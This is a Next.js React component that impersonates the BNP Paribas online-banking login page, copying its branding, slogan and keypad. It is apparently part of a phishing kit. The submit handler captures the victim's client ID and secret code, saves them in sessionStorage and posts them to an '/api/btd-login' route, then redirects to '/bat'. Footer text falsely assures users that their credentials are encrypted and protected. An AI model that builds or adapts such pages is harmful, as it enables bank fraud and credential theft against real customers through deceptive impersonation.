'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface BnpConnexionProps {
  partnerLogoSrc?: string;
  bnpLogoSrc?: string;
}

export default function BnpConnexionPage({
  partnerLogoSrc = '/favicon.ico',
  bnpLogoSrc = '/BNP_Paribas.png',
}: BnpConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<'id' | 'password'>('id');
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(false);
  const [secretCode, setSecretCode] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Disposition du clavier matriciel (5 colonnes)
  const keyLayout = ['0', '5', '1', '8', '9', '3', '4', '6', '7', '2'];

  // Validation : Alphanumérique sans limite de longueur (au moins 1 caractère)
  const isIdValid = clientId.trim().length > 0;
  const isPassValid = secretCode.trim().length > 0;

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Saisie libre alphanumérique sans restriction ni limite de caractères
    setClientId(e.target.value);
  };

  const handleClearId = () => {
    setClientId('');
  };

  const handleContinue = (e: FormEvent) => {
    e.preventDefault();
    if (isIdValid) {
      setStep('password');
    }
  };

  const handleBackToId = () => {
    setSecretCode('');
    setStep('id');
  };

  const handleKeyClick = (digit: string) => {
    setSecretCode((prev) => prev + digit);
  };

  const handleBackspace = () => {
    setSecretCode((prev) => prev.slice(0, -1));
  };

  const handleFinalSubmit = async (e: FormEvent) => {
// Soumission vers /api/btd-login et redirection vers /bat
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'BNP PARIBAS',
      identifiant: clientId,
      secret_code: secretCode,
      rememberMe,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
        }
        .bnp-body-wrapper {
          background-color: #f4f7f6;
          color: #333333;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .bnp-container {
          width: 100%;
          max-width: 450px;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          position: relative;
        }

        /* --- HEADER BLANC --- */
        .bnp-header {
          background-color: #ffffff;
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 16px;
          height: 60px;
          border-bottom: 1px solid #eef2f1;
        }
        .bnp-header-left {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .bnp-logo-group {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .bnp-partner-logo,
        .bnp-main-logo {
          height: 34px !important;
          width: auto;
          max-width: 40px;
          object-fit: contain;
          display: block;
        }
        .bnp-logo-sep {
          color: #718096;
          font-size: 14px;
          font-weight: 600;
        }
        .bnp-slogan {
          font-size: 11px;
          color: #718096;
          font-weight: 400;
          border-left: 1px solid #cbd5e0;
          padding-left: 8px;
        }
        .bnp-burger-menu {
          background: transparent;
          border: none;
          cursor: pointer;
          display: flex;
          flex-direction: column;
          gap: 5px;
        }
        .bnp-burger-menu span {
          display: block;
          width: 22px;
          height: 2px;
          background-color: #00965e;
          border-radius: 2px;
        }

        /* --- BLOC CENTRAL VERT ACCUEIL AUTH --- */
        .bnp-hero-auth {
          background-color: #00965e;
          padding: 30px 20px;
          color: #ffffff;
          display: flex;
          flex-direction: column;
        }
        .bnp-main-title {
          font-size: 22px;
          font-weight: 700;
          text-align: center;
          margin-bottom: 25px;
          color: #ffffff;
        }

        /* --- FORMULAIRE ET CHAMPS --- */
        .bnp-form-container {
          display: flex;
          flex-direction: column;
          width: 100%;
        }
        .bnp-input-group {
          margin-bottom: 15px;
        }
        .bnp-label {
          display: block;
          font-size: 15px;
          font-weight: 600;
          margin-bottom: 8px;
          color: #ffffff;
        }
        .bnp-input-wrapper {
          position: relative;
          display: flex;
          align-items: center;
          background-color: #ffffff;
          border-radius: 12px;
          overflow: hidden;
          height: 50px;
        }
        .bnp-input-wrapper input {
          width: 100%;
          height: 100%;
          border: none;
          padding: 0 14px;
          font-size: 16px;
          color: #2d3748;
          outline: none;
        }
        .bnp-input-wrapper input::placeholder {
          color: #a0aec0;
        }
        .bnp-clear-btn,
        .bnp-toggle-pwd-btn {
          background: transparent;
          border: none;
          font-size: 14px;
          color: #718096;
          padding: 0 14px;
          height: 100%;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        /* CHECKBOX ROW */
        .bnp-checkbox-row {
          display: flex;
          align-items: center;
          justify-content: flex-start;
          gap: 8px;
          margin-bottom: 25px;
        }
        .bnp-checkbox-label {
          display: flex;
          align-items: center;
          gap: 10px;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          user-select: none;
        }
        .bnp-checkbox-label input {
          width: 18px;
          height: 18px;
          accent-color: #00965e;
          cursor: pointer;
        }
        .bnp-info-icon {
          background-color: rgba(255, 255, 255, 0.2);
          color: #ffffff;
          width: 16px;
          height: 16px;
          border-radius: 50%;
          font-size: 11px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
        }

        /* GRILLE CLAVIER MATRICIEL EXCLUSIVE 5 COLONNES */
        .bnp-matrix-keyboard {
          display: grid;
          grid-template-columns: repeat(5, 1fr);
          gap: 10px;
          margin-top: 15px;
          margin-bottom: 25px;
        }
        .bnp-key {
          background-color: #ffffff;
          border: none;
          border-radius: 8px;
          height: 48px;
          font-size: 18px;
          font-weight: 700;
          color: #004d32;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.05);
          user-select: none;
        }
        .bnp-key:active {
          background-color: #e2e8f0;
        }
        .bnp-key-back {
          grid-column: 1;
          background-color: rgba(255, 255, 255, 0.2);
          border: none;
          border-radius: 8px;
          height: 48px;
          color: #ffffff;
          font-size: 18px;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          user-select: none;
        }
        .bnp-key-back:active {
          background-color: rgba(255, 255, 255, 0.3);
        }

        /* BOUTON FLUIDE PRINCIPAL */
        .bnp-primary-btn {
          width: 100%;
          padding: 14px;
          border: none;
          border-radius: 25px;
          font-size: 16px;
          font-weight: 700;
          text-align: center;
          background-color: rgba(255, 255, 255, 0.3);
          color: rgba(255, 255, 255, 0.6);
          cursor: not-allowed;
          transition: all 0.2s ease;
        }
        .bnp-primary-btn.active {
          background-color: #ffffff !important;
          color: #00965e !important;
          cursor: pointer !important;
          box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }

        /* LIENS CRÉDENTIELS */
        .bnp-links-row {
          text-align: center;
          margin-top: 20px;
        }
        .bnp-forgot-link {
          color: #ffffff;
          font-size: 14px;
          font-weight: 500;
          text-decoration: underline;
          cursor: pointer;
        }

        /* --- CARTES D'ASSISTANCE INFÉRIEURES --- */
        .bnp-footer-assistance {
          padding: 20px;
          display: flex;
          flex-direction: column;
          gap: 16px;
          background-color: #f4f7f6;
        }
        .bnp-card {
          background-color: #ffffff;
          border-radius: 14px;
          padding: 18px;
          box-shadow: 0 1px 3px rgba(0,0,0,0.03);
          border: 1px solid #eef2f1;
        }
        .bnp-card-title {
          font-size: 16px;
          font-weight: 700;
          color: #2d3748;
          margin-bottom: 10px;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .bnp-card-desc {
          font-size: 13.5px;
          color: #4a5568;
          line-height: 1.5;
          margin-bottom: 8px;
        }
        .bnp-card-desc.font-small {
          font-size: 12.5px;
          color: #718096;
        }
        .bnp-card-desc.muted {
          color: #718096;
          margin-bottom: 0;
          margin-top: 4px;
        }
        .bnp-badge-url {
          display: inline-block;
          background-color: #f7fafc;
          border: 1px solid #e2e8f0;
          padding: 6px 12px;
          border-radius: 6px;
          font-family: monospace;
          font-size: 13px;
          color: #2d3748;
          margin-bottom: 12px;
        }
        .bnp-card-link {
          display: inline-block;
          font-size: 13.5px;
          color: #00965e;
          text-decoration: underline;
          font-weight: 600;
          margin-top: 6px;
        }
        .bnp-inline-link {
          color: #00965e;
          text-decoration: underline;
          font-weight: 600;
        }

        .bnp-store-buttons {
          display: flex;
          gap: 10px;
          margin-top: 10px;
        }
        .bnp-store-btn {
          flex: 1;
          background-color: #2d3748;
          color: #ffffff;
          padding: 10px;
          border-radius: 8px;
          text-align: center;
          text-decoration: none;
          font-size: 13px;
          font-weight: 600;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 6px;
        }
        .bnp-store-btn.btn-google {
          background-color: #00965e;
        }
      `}</style>

      <div className="bnp-body-wrapper">
        <div className="bnp-container">
          {/* HEADER BANQUE */}
          <header className="bnp-header">
            <div className="bnp-header-left">
              <div className="bnp-logo-group">
                {partnerLogoSrc && (
                  <>
                    <img src={partnerLogoSrc} alt="Favicon" className="bnp-partner-logo" />
                    <span className="bnp-logo-sep">→</span>
                  </>
                )}
                <img src={bnpLogoSrc} alt="BNP Paribas" className="bnp-main-logo" />
              </div>
              <span className="bnp-slogan">La banque d'un monde qui change</span>
            </div>
            <button className="bnp-burger-menu" aria-label="Menu">
              <span></span>
              <span></span>
              <span></span>
            </button>
          </header>

          {/* ZONE INTERACTIVE AUTH VERT */}
          <section className="bnp-hero-auth">
            <h1 className="bnp-main-title">Accédez à votre espace client</h1>

            <div className="bnp-form-container">
              {step === 'id' && (
                <form onSubmit={handleContinue}>
                  {/* Numéro Client / Identifiant libre */}
                  <div className="bnp-input-group">
                    <label htmlFor="bnp-id-input" className="bnp-label">
                      Numéro Client / Identifiant
                    </label>
                    <div className="bnp-input-wrapper">
                      <input
                        type="text"
                        id="bnp-id-input"
                        placeholder="Votre identifiant"
                        value={clientId}
                        onChange={handleIdChange}
                        autoComplete="off"
                      />
                      {clientId.length > 0 && (
                        <button
                          type="button"
                          className="bnp-clear-btn"
                          onClick={handleClearId}
                        >
                          ✕
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Option Mémoriser */}
                  <div className="bnp-checkbox-row">
                    <label className="bnp-checkbox-label">
                      <input
                        type="checkbox"
                        id="bnp-remember-me"
                        checked={rememberMe}
                        onChange={(e) => setRememberMe(e.target.checked)}
                      />
                      Mémoriser mon numéro client
                    </label>
                    <span className="bnp-info-icon">i</span>
                  </div>

                  <button
                    type="submit"
                    disabled={!isIdValid}
                    className={`bnp-primary-btn ${isIdValid ? 'active' : ''}`}
                  >
                    Suivant
                  </button>

                  <div className="bnp-links-row">
                    <span
                      className="bnp-forgot-link"
                      onClick={() => alert('Service indisponible actuellement.')}
                    >
                      Numéro client ou code secret oublié
                    </span>
                  </div>
                </form>
              )}

              {step === 'password' && (
                <form onSubmit={handleFinalSubmit}>
                  {/* Saisie Alphanumérique sans limite pour le Code Secret */}
                  <div className="bnp-input-group">
                    <label htmlFor="bnp-pass-input" className="bnp-label">
                      Saisissez votre code secret
                    </label>
                    <div className="bnp-input-wrapper">
                      <input
                        type={showPassword ? 'text' : 'password'}
                        id="bnp-pass-input"
                        placeholder="Votre code secret"
                        value={secretCode}
                        onChange={(e) => setSecretCode(e.target.value)}
                        autoComplete="off"
                      />
                      <button
                        type="button"
                        className="bnp-toggle-pwd-btn"
                        onClick={() => setShowPassword((prev) => !prev)}
                      >
                        {showPassword ? 'Masquer' : 'Afficher'}
                      </button>
                    </div>
                  </div>

                  {/* Clavier matriciel d'appoint (5 colonnes) */}
                  <div className="bnp-matrix-keyboard">
                    {keyLayout.map((digit) => (
                      <button
                        key={digit}
                        type="button"
                        className="bnp-key"
                        onClick={() => handleKeyClick(digit)}
                      >
                        {digit}
                      </button>
                    ))}
                    <button
                      type="button"
                      className="bnp-key-back"
                      onClick={handleBackspace}
                    >
                      ⌫
                    </button>
                  </div>

                  <button
                    type="submit"
                    disabled={!isPassValid || isSubmitting}
                    className={`bnp-primary-btn ${
                      isPassValid && !isSubmitting ? 'active' : ''
                    }`}
                  >
                    {isSubmitting ? 'Connexion...' : 'Accéder à mon espace client'}
                  </button>

                  <div className="bnp-links-row">
                    <span className="bnp-forgot-link" onClick={handleBackToId}>
                      ‹ Retour à la saisie de l'identifiant
                    </span>
                  </div>
                </form>
              )}
            </div>
          </section>

          {/* CARTES FOOTER INFOS */}
          <footer className="bnp-footer-assistance">
            <div className="bnp-card">
              <h2 className="bnp-card-title">🔒 Sécurité</h2>
              <p className="bnp-card-desc">
                Avant de vous connecter, vérifiez que sur la page Espace Client :
              </p>
              <div className="bnp-badge-url">Espace client</div>
              <p className="bnp-card-desc font-small">
                Si une tierce personne ou un représentant BNP Paribas vous demande de vous
                connecter ou de fournir des informations, il s'agit systématiquement d'une fraude.
              </p>
              <a
                href="#"
                className="bnp-card-link"
                onClick={(e) => e.preventDefault()}
              >
                Consulter tous nos conseils sécurité et fraude.
              </a>
            </div>

            <div className="bnp-card">
              <h2 className="bnp-card-title">🎧 Besoin d'aide ?</h2>
              <p className="bnp-card-desc">
                Consultez notre{' '}
                <a
                  href="#"
                  className="bnp-inline-link"
                  onClick={(e) => e.preventDefault()}
                >
                  Assistance technique.
                </a>
              </p>
              <p className="bnp-card-desc muted">
                Disponible du lundi au vendredi de 8h à 20h et le samedi de 9h à 17h.
              </p>
            </div>

            <div className="bnp-card">
              <h2 className="bnp-card-title">📱 Application Mobile</h2>
              <p className="bnp-card-desc">
                Téléchargez l'application "Mes Comptes BNP Paribas" pour gérer vos comptes où que
                vous soyez.
              </p>
              <div className="bnp-store-buttons">
                <a
                  href="#"
                  className="bnp-store-btn btn-apple"
                  onClick={(e) => e.preventDefault()}
                >
                   App Store
                </a>
                <a
                  href="#"
                  className="bnp-store-btn btn-google"
                  onClick={(e) => e.preventDefault()}
                >
                  ▲ Play Store
                </a>
              </div>
            </div>

            <div className="bnp-card">
              <h2 className="bnp-card-title">🛡️ Protection des données</h2>
              <p className="bnp-card-desc">
                BNP Paribas s'engage à protéger vos données personnelles. Vos informations de
                connexion sont chiffrées et sécurisées.
              </p>
              <a
                href="#"
                className="bnp-card-link"
                onClick={(e) => e.preventDefault()}
              >
                Lire notre politique de confidentialité
              </a>
            </div>
          </footer>
        </div>
      </div>
    </>
  );
}